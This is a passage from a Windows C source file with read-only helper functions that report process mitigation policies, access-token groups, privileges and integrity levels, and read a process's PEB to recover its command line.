	}
	else {
		memcpy(&SideChannelIsolationPolicy, &PolicyInfo.SideChannelIsolationPolicy, sizeof(SideChannelIsolationPolicy));
		if (SideChannelIsolationPolicy.SmtBranchTargetIsolation) {
			lpResult = StrCatExA(lpResult, "SMT-thread branch target isolation, ");
		}
		else if (SideChannelIsolationPolicy.IsolateSecurityDomain) {
			lpResult = StrCatExA(lpResult, "Distinct security domain, ");
		}
		else if (SideChannelIsolationPolicy.DisablePageCombine) {
			lpResult = StrCatExA(lpResult, "Restricted page combining, ");
		}
		else if (SideChannelIsolationPolicy.SpeculativeStoreBypassDisable) {
			lpResult = StrCatExA(lpResult, "Memory disambiguation (SSBD), ");
		}
	}

	PolicyInfo.Policy = ProcessUserShadowStackPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&ShadowStackPolicy, &PolicyInfo.UserShadowStackPolicy, sizeof(ShadowStackPolicy));
		if (ShadowStackPolicy.AuditUserShadowStack || ShadowStackPolicy.EnableUserShadowStack) {
			if (ShadowStackPolicy.AuditUserShadowStack) {
				lpResult = StrCatExA(lpResult, "Audit ");
			}

			if (ShadowStackPolicy.EnableUserShadowStackStrictMode) {
				lpResult = StrCatExA(lpResult, "Strict ");
			}

			lpResult = StrCatExA(lpResult, "Stack protection, ");
		}
	}

	PolicyInfo.Policy = ProcessRedirectionTrustPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&RedirectionTrustPolicy, &PolicyInfo.RedirectionTrustPolicy, sizeof(RedirectionTrustPolicy));
		if (RedirectionTrustPolicy.AuditRedirectionTrust) {
			lpResult = StrCatExA(lpResult, "Junction redirection protection (Audit), ");
		}
	}

	PolicyInfo.Policy = ProcessUserPointerAuthPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&UserPointerAuthPolicy, &PolicyInfo.UserPointerAuthPolicy, sizeof(UserPointerAuthPolicy));
		if (UserPointerAuthPolicy.EnablePointerAuthUserIp) {
			lpResult = StrCatExA(lpResult, "ARM pointer authentication, ");
		}
	}

	PolicyInfo.Policy = ProcessSEHOPPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&SEHPolicy, &PolicyInfo.SEHOPPolicy, sizeof(SEHPolicy));
		if (SEHPolicy.EnableSehop) {
			lpResult = StrCatExA(lpResult, "Structured exception handling overwrite protection (SEHOP), ");
		}
	}

	lpResult[lstrlenA(lpResult) - 2] = '\0';
CLEANUP:
	return lpResult;
}

LPSTR GetSecurityAttributeFlagsString
(
	_In_ ULONG uFlags
)
{
	LPSTR lpResult = NULL;

	if (uFlags & TOKEN_SECURITY_ATTRIBUTE_MANDATORY) {
		lpResult = StrCatExA(lpResult, "Mandatory, ");
	}

	if (uFlags & TOKEN_SECURITY_ATTRIBUTE_DISABLED) {
		lpResult = StrCatExA(lpResult, "Disabled, ");
	}

	if (uFlags & TOKEN_SECURITY_ATTRIBUTE_DISABLED_BY_DEFAULT) {
		lpResult = StrCatExA(lpResult, "Default disabled, ");
	}

	if (uFlags & TOKEN_SECURITY_ATTRIBUTE_USE_FOR_DENY_ONLY) {
		lpResult = StrCatExA(lpResult, "Use for deny only, ");
	}

	if (uFlags & TOKEN_SECURITY_ATTRIBUTE_VALUE_CASE_SENSITIVE) {
		lpResult = StrCatExA(lpResult, "Case-sensitive, ");
	}

	if (uFlags & TOKEN_SECURITY_ATTRIBUTE_NON_INHERITABLE) {
		lpResult = StrCatExA(lpResult, "Non-inheritable, ");
	}

	if (uFlags & TOKEN_SECURITY_ATTRIBUTE_COMPARE_IGNORE) {
		lpResult = StrCatExA(lpResult, "Compare-ignore, ");
	}

	if (lpResult != NULL) {
		lpResult[lstrlenA(lpResult) - 2] = '\0';
		return lpResult;
	}
	else {
		return DuplicateStrA("(None)", 0);
	}
}

PTOKEN_GROUPS GetTokenGroups
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	PTOKEN_GROUPS pResult = NULL;
	ULONG cbResult = sizeof(TOKEN_GROUPS);

	pResult = ALLOC(cbResult);
	while (TRUE) {
		Status = NtQueryInformationToken(hToken, TokenGroups, pResult, cbResult, &cbResult);
		if (!NT_SUCCESS(Status)) {
			if (Status == STATUS_BUFFER_OVERFLOW || Status == STATUS_BUFFER_TOO_SMALL) {
				pResult = REALLOC(pResult, cbResult);
			}
			else {
				FREE(pResult);
				pResult = NULL;
				LOG_ERROR("NtQueryInformationToken", Status);
				goto CLEANUP;
			}
		}
		else {
			goto CLEANUP;
		}
	}

CLEANUP:
	return pResult;
}

LPSTR LookupNameOfSid
(
	_In_ PSID pSid,
	_In_ BOOL IncludeDomain
)
{
	LSA_HANDLE hPolicy = NULL;
	NTSTATUS Status = 0;
	OBJECT_ATTRIBUTES ObjectAttributes;
	LPSTR lpResult = NULL;
	LPSTR lpTemp = NULL;
	PLSA_REFERENCED_DOMAIN_LIST pReferencedDomains = NULL;
	PLSA_TRANSLATED_NAME pNames = NULL;
	PLSA_TRUST_INFORMATION pTrustInfo = NULL;
	LPWSTR lpDomainName = NULL;
	WCHAR wszTempStr[0x40];

	SecureZeroMemory(wszTempStr, sizeof(wszTempStr));
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	Status = LsaOpenPolicy(NULL, &ObjectAttributes, POLICY_LOOKUP_NAMES, &hPolicy);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("LsaOpenPolicy", Status);
		goto CLEANUP;
	}

	Status = LsaLookupSids(hPolicy, 1, &pSid, &pReferencedDomains, &pNames);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("LsaLookupSids", Status);
		goto CLEANUP;
	}

	if (pNames[0].Use != SidTypeInvalid && pNames[0].Use != SidTypeUnknown) {
		memcpy(wszTempStr, pNames[0].Name.Buffer, pNames[0].Name.Length);
		lpTemp = ConvertWcharToChar(wszTempStr);
		if (IncludeDomain && pNames[0].DomainIndex >= 0) {
			pTrustInfo = &pReferencedDomains->Domains[pNames[0].DomainIndex];
			lpResult = ConvertWcharToChar(pTrustInfo->Name.Buffer);
			if (lstrlenA(lpResult) > 0) {
				lpResult = StrCatExA(lpResult, "\\");
			}

			lpResult = StrCatExA(lpResult, lpTemp);
		}
		else {
			lpResult = DuplicateStrA(lpTemp, 0);
		}
	}

CLEANUP:
	if (hPolicy != NULL) {
		LsaClose(hPolicy);
	}

	if (pReferencedDomains != NULL) {
		LsaFreeMemory(pReferencedDomains);
	}

	FREE(lpTemp);
	if (pNames != NULL) {
		LsaFreeMemory(pNames);
	}

	return lpResult;
}

BOOL IsTokenElevated
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	TOKEN_ELEVATION Elevation;
	ULONG uReturnedLength = 0;

	SecureZeroMemory(&Elevation, sizeof(Elevation));
	Status = NtQueryInformationToken(hToken, TokenElevation, &Elevation, sizeof(Elevation), &uReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationToken", Status);
		return FALSE;
	}

	return Elevation.TokenIsElevated != 0;
}

BOOL IsTokenAppContainer
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	ULONG uResult = 0;
	ULONG uReturnedLength = 0;

	Status = NtQueryInformationToken(hToken, TokenIsAppContainer, &uResult, sizeof(uResult), &uReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationToken", Status);
		return FALSE;
	}

	return uResult != 0;
}

LPSTR GetTokenIntegrityLevel
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	LPSTR lpResult = NULL;
	ULONG uReturnedLength = 0;
	BYTE bSubAuthorityCount = 0;
	BYTE MandatoryLabelBuffer[TOKEN_INTEGRITY_LEVEL_MAX_SIZE];
	PTOKEN_MANDATORY_LABEL pMandatoryLabel = (PTOKEN_MANDATORY_LABEL)MandatoryLabelBuffer;
	ULONG uSubAuthority = SECURITY_MANDATORY_UNTRUSTED_RID;

	Status = NtQueryInformationToken(hToken, TokenIntegrityLevel, pMandatoryLabel, sizeof(MandatoryLabelBuffer), &uReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationToken", Status);
		return FALSE;
	}

	bSubAuthorityCount = ((PISID)(pMandatoryLabel->Label.Sid))->SubAuthorityCount;
	if (bSubAuthorityCount > 0) {
		uSubAuthority = ((PISID)(pMandatoryLabel->Label.Sid))->SubAuthority[bSubAuthorityCount - 1];
	}

	if (uSubAuthority == SECURITY_MANDATORY_UNTRUSTED_RID) {
		lpResult = DuplicateStrA("Untrusted", 0);
	}
	else if (uSubAuthority == SECURITY_MANDATORY_LOW_RID) {
		lpResult = DuplicateStrA("Low", 0);
	}
	else if (uSubAuthority == SECURITY_MANDATORY_MEDIUM_RID) {
		lpResult = DuplicateStrA("Medium", 0);
	}
	else if (uSubAuthority == SECURITY_MANDATORY_MEDIUM_PLUS_RID) {
		lpResult = DuplicateStrA("Medium +", 0);
	}
	else if (uSubAuthority == SECURITY_MANDATORY_HIGH_RID) {
		lpResult = DuplicateStrA("High", 0);
	}
	else if (uSubAuthority == SECURITY_MANDATORY_SYSTEM_RID) {
		lpResult = DuplicateStrA("System", 0);
	}
	else if (uSubAuthority == SECURITY_MANDATORY_PROTECTED_PROCESS_RID) {
		lpResult = DuplicateStrA("Protected", 0);
	}
	else {
		lpResult = DuplicateStrA("Other", 0);
	}

CLEANUP:
	return lpResult;
}

TOKEN_ELEVATION_TYPE GetTokenElevationType
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	TOKEN_ELEVATION_TYPE ElevationType = 0;
	ULONG uReturnedLength;

	Status = NtQueryInformationToken(hToken, TokenElevationType, &ElevationType, sizeof(ElevationType), &uReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationToken", Status);
		return FALSE;
	}

	return ElevationType;
}

PTOKEN_USER GetTokenUser
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	PTOKEN_USER pResult = NULL;
	DWORD cbResult = sizeof(TOKEN_USER);

	pResult = (PTOKEN_USER)ALLOC(cbResult);
	while (TRUE) {
		Status = NtQueryInformationToken(hToken, TokenUser, pResult, cbResult, &cbResult);
		if (NT_SUCCESS(Status)) {
			goto CLEANUP;
		}
		else if (Status == STATUS_BUFFER_OVERFLOW || Status == STATUS_BUFFER_TOO_SMALL) {
			pResult = (PTOKEN_USER)REALLOC(pResult, cbResult);
		}
		else {
			LOG_ERROR("NtQueryInformationToken", Status);
			FREE(pResult);
			pResult = NULL;
			goto CLEANUP;
		}
	}
	
CLEANUP:
	return pResult;
}

LSA_USER_ACCOUNT_TYPE GetSidAccountType
(
	_In_ PSID pSid
)
{
	LSALOOKUPUSERACCOUNTTYPE fnLsaLookupUserAccountType = NULL;
	HMODULE hDllModule = NULL;
	LSA_USER_ACCOUNT_TYPE Result = UnknownUserAccountType;
	NTSTATUS Status = 0;

	hDllModule = LoadLibraryW(L"sechost.dll");
	if (hDllModule == NULL) {
		LOG_ERROR("LoadLibraryW", GetLastError());
		goto CLEANUP;
	}

	fnLsaLookupUserAccountType = (LSALOOKUPUSERACCOUNTTYPE)GetProcAddress(hDllModule, "LsaLookupUserAccountType");
	if (fnLsaLookupUserAccountType == NULL) {
		LOG_ERROR("GetProcAddress", GetLastError());
		goto CLEANUP;
	}

	Status = fnLsaLookupUserAccountType(pSid, &Result);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("LsaLookupUserAccountType", Status);
		goto CLEANUP;
	}

CLEANUP:
	return Result;
}

PSID_IDENTIFIER_AUTHORITY PhIdentifierAuthoritySid
(
	_In_ PSID pSid
)
{
	return &((PISID)pSid)->IdentifierAuthority;
}

BOOL EqualIdentifierAuthoritySid
(
	_In_ PSID_IDENTIFIER_AUTHORITY IdentifierAuthoritySid1,
	_In_ PSID_IDENTIFIER_AUTHORITY IdentifierAuthoritySid2
)
{
	return (BOOL)RtlEqualMemory(IdentifierAuthoritySid1, IdentifierAuthoritySid2, sizeof(SID_IDENTIFIER_AUTHORITY));
}

PTOKEN_GROUP_INFO GetTokenGroupsInfo
(
	_In_ HANDLE hToken,
	_Out_ PDWORD pGroupCount
)
{
	PTOKEN_GROUPS pTokenGroups = NULL;
	DWORD i = 0;
	PTOKEN_GROUP_INFO pResult = NULL;
	DWORD dwAttributes;
	PTOKEN_GROUP_INFO pTemp = NULL;
	LPSTR lpTemp = NULL;
	LSA_USER_ACCOUNT_TYPE AccountType = 0;
	PSID pGroupSid = NULL;

	pTokenGroups = GetTokenGroups(hToken);
	if (pTokenGroups == NULL) {
		goto CLEANUP;
	}

	pResult = ALLOC(pTokenGroups->GroupCount * sizeof(TOKEN_GROUP_INFO));
	for (i = 0; i < pTokenGroups->GroupCount; i++) {
		pTemp = &pResult[i];
		dwAttributes = pTokenGroups->Groups[i].Attributes;
		if (dwAttributes & (SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED)) {
			pTemp->lpDesc = StrCatExA(pTemp->lpDesc, "Integrity, ");
			if (dwAttributes & SE_GROUP_ENABLED) {
				pTemp->lpStatus = StrCatExA(pTemp->lpStatus, "Enabled (as a group)");
			}
		}
		else {
			if (dwAttributes & SE_GROUP_ENABLED) {
				if (dwAttributes & SE_GROUP_ENABLED_BY_DEFAULT) {
					pTemp->lpStatus = StrCatExA(pTemp->lpStatus, "Enabled");
				}
				else {
					pTemp->lpStatus = StrCatExA(pTemp->lpStatus, "Enabled (modified)");
				}
			}
			else {
				if (dwAttributes & SE_GROUP_ENABLED_BY_DEFAULT) {
					pTemp->lpStatus = StrCatExA(pTemp->lpStatus, "Disabled (modified)");
				}
				else {
					pTemp->lpStatus = StrCatExA(pTemp->lpStatus, "Disabled");
				}
			}

			if (dwAttributes & SE_GROUP_LOGON_ID) {
				pTemp->lpDesc = StrCatExA(pTemp->lpDesc, "Logon Id, ");
			}

			if (dwAttributes & SE_GROUP_OWNER) {
				pTemp->lpDesc = StrCatExA(pTemp->lpDesc, "Owner, ");
			}

			if (dwAttributes & SE_GROUP_MANDATORY) {
				pTemp->lpDesc = StrCatExA(pTemp->lpDesc, "Mandatory, ");
			}

			if (dwAttributes & SE_GROUP_USE_FOR_DENY_ONLY) {
				pTemp->lpDesc = StrCatExA(pTemp->lpDesc, "Use for deny only, ");
			}

			if (dwAttributes & SE_GROUP_RESOURCE) {
				pTemp->lpDesc = StrCatExA(pTemp->lpDesc, "Resource, ");
			}
		}

		if (lstrlenA(pTemp->lpDesc) >= 2) {
			pTemp->lpDesc[lstrlenA(pTemp->lpDesc) - 2] = '\0';
		}

		lpTemp = NULL;
		pGroupSid = pTokenGroups->Groups[i].Sid;
		ConvertSidToStringSidA(pGroupSid, &lpTemp);
		pTemp->lpSID = DuplicateStrA(lpTemp, 0);
		LocalFree(lpTemp);
		pTemp->lpName = LookupNameOfSid(pGroupSid, TRUE);

		AccountType = GetSidAccountType(pGroupSid);
		if (AccountType == UnknownUserAccountType) {
			if (EqualIdentifierAuthoritySid(PhIdentifierAuthoritySid(pGroupSid), &(SID_IDENTIFIER_AUTHORITY)SECURITY_NULL_SID_AUTHORITY)) {
				pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "NULL (Authority)");
			}
			else if (EqualIdentifierAuthoritySid(PhIdentifierAuthoritySid(pGroupSid), &(SID_IDENTIFIER_AUTHORITY)SECURITY_WORLD_SID_AUTHORITY)) {
				pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "World (Authority)");
			}
			else if (EqualIdentifierAuthoritySid(PhIdentifierAuthoritySid(pGroupSid), &(SID_IDENTIFIER_AUTHORITY)SECURITY_LOCAL_SID_AUTHORITY)) {
				pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "Local (Authority)");
			}
			else if (EqualIdentifierAuthoritySid(PhIdentifierAuthoritySid(pGroupSid), &(SID_IDENTIFIER_AUTHORITY)SECURITY_NT_AUTHORITY)) {
				pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "NT (Authority)");
			}
			else if (EqualIdentifierAuthoritySid(PhIdentifierAuthoritySid(pGroupSid), &(SID_IDENTIFIER_AUTHORITY)SECURITY_APP_PACKAGE_AUTHORITY)) {
				pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "APP_PACKAGE (Authority)");
			}
			else if (EqualIdentifierAuthoritySid(PhIdentifierAuthoritySid(pGroupSid), &(SID_IDENTIFIER_AUTHORITY)SECURITY_MANDATORY_LABEL_AUTHORITY)) {
				pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "Mandatory label");
			}
			else {
				pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "Unknown");
			}
		}
		else if (AccountType == LocalUserAccountType) {
			pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "Local");
		}
		else if (AccountType == PrimaryDomainUserAccountType || AccountType == ExternalDomainUserAccountType) {
			pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "ActiveDirectory");
		}
		else if (AccountType == LocalConnectedUserAccountType || AccountType == MSAUserAccountType) {
			pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "Microsoft");
		}
		else if (AccountType == AADUserAccountType) {
			pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "AzureAD");
		}
		else if (AccountType == InternetUserAccountType) {
			pTemp->lpMandatoryLabel = StrCatExA(pTemp->lpMandatoryLabel, "Internet");
		}
	}

	if (pGroupCount != NULL) {
		*pGroupCount = pTokenGroups->GroupCount;
	}

CLEANUP:
	FREE(pTokenGroups);

	return pResult;
}

ULONG GetTokenSessionID
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	ULONG uResult = 0;
	DWORD dwReturnedLength = 0;

	Status = NtQueryInformationToken(hToken, TokenSessionId, &uResult, sizeof(uResult), &dwReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationToken", Status);
		goto CLEANUP;
	}

CLEANUP:
	return uResult;
}

PTOKEN_INFO GetTokenInfo
(
	_In_ HANDLE hProc
)
{
	PTOKEN_INFO pResult = NULL;
	HANDLE hToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	LPSTR lpTemp = NULL;

	if (!OpenProcessToken(hProc, TOKEN_READ, &hToken)) {
		LOG_ERROR("OpenProcessToken", GetLastError());
		goto CLEANUP;
	}

	pTokenUser = GetTokenUser(hToken);
	if (pTokenUser == NULL) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(TOKEN_INFO));
	pResult->pTokenGroupsInfo = GetTokenGroupsInfo(hToken, &pResult->dwGroupCount);
	pResult->lpUserName = LookupNameOfSid(pTokenUser->User.Sid, TRUE);
	ConvertSidToStringSidA(pTokenUser->User.Sid, &lpTemp);
	pResult->lpUserSID = DuplicateStrA(lpTemp, 0);
	LocalFree(lpTemp);
	pResult->dwSession = GetTokenSessionID(hToken);
	pResult->ElevationType = GetTokenElevationType(hToken);
	pResult->IsElevated = IsTokenElevated(hToken);
	pResult->lpIntegrityLevel = GetTokenIntegrityLevel(hToken);
	pResult->pPrivileges = GetTokenPrivileges(hToken);
CLEANUP:
	FREE(pTokenUser);
	if (hToken != NULL) {
		CloseHandle(hToken);
	}

	return pResult;
}

VOID FreeTokenInfo
(
	_In_ PTOKEN_INFO pTokenInfo
)
{
	PTOKEN_GROUP_INFO pGroupInfo = NULL;

	if (pTokenInfo != NULL) {
		pGroupInfo = pTokenInfo->pTokenGroupsInfo;
		if (pGroupInfo != NULL) {
			FREE(pGroupInfo->lpName);
			FREE(pGroupInfo->lpSID);
			FREE(pGroupInfo->lpStatus);
			FREE(pGroupInfo->lpDesc);
			FREE(pGroupInfo->lpMandatoryLabel);
			FREE(pGroupInfo);
		}

		FREE(pTokenInfo->lpIntegrityLevel);
		FREE(pTokenInfo);
	}
}

PTOKEN_SECURITY_ATTRIBUTES_INFORMATION GetTokenSecurityAttributes
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	PTOKEN_SECURITY_ATTRIBUTES_INFORMATION pResult = NULL;
	ULONG cbResult = sizeof(TOKEN_SECURITY_ATTRIBUTES_INFORMATION);

	pResult = ALLOC(cbResult);
	while (TRUE) {
		Status = NtQueryInformationToken(hToken, TokenSecurityAttributes, pResult, cbResult, &cbResult);
		if (!NT_SUCCESS(Status)) {
			if (Status == STATUS_BUFFER_OVERFLOW || Status == STATUS_BUFFER_TOO_SMALL) {
				pResult = REALLOC(pResult, cbResult);
			}
			else {
				FREE(pResult);
				pResult = NULL;
				goto CLEANUP;
			}
		}
		else {
			LOG_ERROR("NtQueryInformationToken", Status);
			goto CLEANUP;
		}
	}

CLEANUP:
	return pResult;
}

PTOKEN_PRIVILEGES GetTokenPrivileges
(
	_In_ HANDLE hToken
)
{
	NTSTATUS Status = 0;
	PTOKEN_PRIVILEGES pResult = NULL;
	ULONG cbResult = sizeof(TOKEN_PRIVILEGES);

	pResult = ALLOC(cbResult);
	while (TRUE) {
		Status = NtQueryInformationToken(hToken, TokenPrivileges, pResult, cbResult, &cbResult);
		if (!NT_SUCCESS(Status)) {
			if (Status == STATUS_BUFFER_OVERFLOW || Status == STATUS_BUFFER_TOO_SMALL) {
				pResult = REALLOC(pResult, cbResult);
			}
			else {
				FREE(pResult);
				pResult = NULL;
				LOG_ERROR("NtQueryInformationToken", Status);
				goto CLEANUP;
			}
		}
		else {
			goto CLEANUP;
		}
	}

CLEANUP:
	return pResult;
}

LPVOID GetProcessPebAddr
(
	_In_ HANDLE hProc
)
{
	PROCESS_BASIC_INFORMATION BasicInfo;
	NTSTATUS Status = 0;

	SecureZeroMemory(&BasicInfo, sizeof(BasicInfo));
	Status = NtQueryInformationProcess(hProc, ProcessBasicInformation, &BasicInfo, sizeof(BasicInfo), NULL);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationProcess", Status);
		return NULL;
	}

	return BasicInfo.PebBaseAddress;
}

PPROCESS_BASIC_INFORMATION GetProcessBasicInfo
(
	_In_ HANDLE hProc
)
{
	PPROCESS_BASIC_INFORMATION pResult = NULL;
	NTSTATUS Status = 0;

	pResult = ALLOC(sizeof(PROCESS_BASIC_INFORMATION));
	Status = NtQueryInformationProcess(hProc, ProcessBasicInformation, pResult, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationProcess", Status);
		return NULL;
	}

	return pResult;
}

ULONG_PTR GetProcessPebAddr32
(
	_In_ HANDLE hProc
)
{
	NTSTATUS Status = 0;
	ULONG_PTR uResult = 0;
	DWORD dwReturnedLength = 0;

	Status = NtQueryInformationProcess(hProc, ProcessWow64Information, &uResult, sizeof(uResult), &dwReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationProcess", Status);
		return 0;
	}

	return uResult;
}

LPSTR GetProcessImagePath
(
	_In_ HANDLE hProc
)
{
	NTSTATUS Status = 0;
	LPVOID lpResult = NULL;
	ULONG cbBuffer = 0;
	ULONG uReturnedLength = 0;
	PUNICODE_STRING pFileName = NULL;

	cbBuffer = sizeof(UNICODE_STRING) + DOS_MAX_PATH_LENGTH;
	pFileName = ALLOC(cbBuffer);
	Status = NtQueryInformationProcess(hProc, ProcessImageFileNameWin32, pFileName, cbBuffer, &uReturnedLength);
	if (Status == STATUS_INFO_LENGTH_MISMATCH) {
		cbBuffer = uReturnedLength;
		pFileName = REALLOC(pFileName, cbBuffer + 1);
		uReturnedLength = 0;
		Status = NtQueryInformationProcess(hProc, ProcessImageFileNameWin32, pFileName, cbBuffer, &uReturnedLength);
	}

	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtQueryInformationProcess", Status);
		return NULL;
	}

	return ConvertWcharToChar(pFileName->Buffer);
}

LPSTR GetProcessCommandLine
(
	_In_ HANDLE hProc
)
{
	NTSTATUS Status = 0;
	LPSTR lpResult = NULL;
	DWORD dwWindowsVersion = 0;
	DWORD cbBuffer = 0;
	DWORD dwReturnedLength = 0;
	PUNICODE_STRING pBuffer = NULL;
	LPVOID lpPebBaseAddr = NULL;
	ULONG uPebBaseAddr32 = 0;
	LPVOID lpProcessParameters = NULL;
	ULONG uProcessParameters32 = 0;
	DWORD dwOffset = 0;
	DWORD dwArch = 0;
	LPSTR lpImagePath = NULL;
	UNICODE_STRING TempStr;
	UNICODE_STRING32 TempStr32;
	LPWSTR lpTemp = NULL;;

	dwWindowsVersion = GetWindowsVersionEx();
	if (dwWindowsVersion >= WINDOWS_8_1) {
		cbBuffer = sizeof(UNICODE_STRING) + DOS_MAX_PATH_LENGTH;
		pBuffer = ALLOC(cbBuffer);
		Status = NtQueryInformationProcess(hProc, ProcessCommandLineInformation, pBuffer, cbBuffer, &dwReturnedLength);
		if (Status == STATUS_INFO_LENGTH_MISMATCH) {
			cbBuffer = dwReturnedLength;
			pBuffer = REALLOC(pBuffer, cbBuffer);
			Status = NtQueryInformationProcess(hProc, ProcessCommandLineInformation, pBuffer, cbBuffer, &dwReturnedLength);
		}

		if (NT_SUCCESS(Status)) {
			lpResult = ConvertWcharToChar(pBuffer->Buffer);
		}
		else {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		lpImagePath = GetProcessImagePath(hProc);
		if (lpImagePath == NULL) {
			goto CLEANUP;
		}

		dwArch = GetImageArchitecture(lpImagePath);
		if (dwArch == IMAGE_FILE_MACHINE_I386) {
			dwOffset = FIELD_OFFSET(RTL_USER_PROCESS_PARAMETERS32, CommandLine);
			uPebBaseAddr32 = GetProcessPebAddr32(hProc);
			if (uPebBaseAddr32 == NULL) {
				goto CLEANUP;
			}

			Status = NtReadVirtualMemory(hProc, PTR_ADD_OFFSET(uPebBaseAddr32, FIELD_OFFSET(PEB32, ProcessParameters)), &uProcessParameters32, sizeof(ULONG), NULL);
			if (!NT_SUCCESS(Status)) {
				LOG_ERROR("NtReadVirtualMemory", Status);
				goto CLEANUP;
			}

			SecureZeroMemory(&TempStr32, sizeof(TempStr32));
			Status = NtReadVirtualMemory(hProc, PTR_ADD_OFFSET(uProcessParameters32, dwOffset), &TempStr32, sizeof(TempStr32), NULL);
			if (!NT_SUCCESS(Status)) {
				LOG_ERROR("NtReadVirtualMemory", Status);
				goto CLEANUP;
			}

			if (TempStr32.Length == 0 || TempStr32.Buffer == NULL) {
				goto CLEANUP;
			}

			lpTemp = ALLOC(TempStr32.Length + sizeof(WCHAR));
			Status = NtReadVirtualMemory(hProc, (PVOID)TempStr32.Buffer, lpTemp, TempStr32.Length, NULL);
			if (!NT_SUCCESS(Status)) {
				LOG_ERROR("NtReadVirtualMemory", Status);
				goto CLEANUP;
			}

			lpResult = ConvertWcharToChar(lpTemp);
		}
		else if (dwArch == IMAGE_FILE_MACHINE_AMD64) {
			dwOffset = FIELD_OFFSET(RTL_USER_PROCESS_PARAMETERS, CommandLine);
			lpPebBaseAddr = GetProcessPebAddr(hProc);
			if (lpPebBaseAddr == NULL) {
				goto CLEANUP;
			}

			Status = NtReadVirtualMemory(hProc, PTR_ADD_OFFSET(lpPebBaseAddr, FIELD_OFFSET(PEB, ProcessParameters)), &lpProcessParameters, sizeof(LPVOID), NULL);
			if (!NT_SUCCESS(Status)) {
				LOG_ERROR("NtReadVirtualMemory", Status);
				goto CLEANUP;
			}

			SecureZeroMemory(&TempStr, sizeof(TempStr));
			Status = NtReadVirtualMemory(hProc, PTR_ADD_OFFSET(lpProcessParameters, dwOffset), &TempStr, sizeof(TempStr), NULL);
			if (!NT_SUCCESS(Status)) {
				LOG_ERROR("NtReadVirtualMemory", Status);
				goto CLEANUP;
			}

			if (TempStr.Length == 0 || TempStr.Buffer == NULL) {
				goto CLEANUP;
			}

			lpTemp = ALLOC(TempStr.Length + sizeof(WCHAR));
			Status = NtReadVirtualMemory(hProc, TempStr.Buffer, lpTemp, TempStr.Length, NULL);
			if (!NT_SUCCESS(Status)) {
				LOG_ERROR("NtReadVirtualMemory", Status);
				goto CLEANUP;
			}

			lpResult = ConvertWcharToChar(lpTemp);
		}
	}
CLEANUP:
	FREE(pBuffer);
	FREE(lpImagePath);
	FREE(lpTemp);

	return lpResult;
}

LPSTR GetProcessCurrentDirectory
(
	_In_ HANDLE hProc
)
{
	NTSTATUS Status = 0;
	LPSTR lpResult = NULL;
	DWORD cbBuffer = 0;
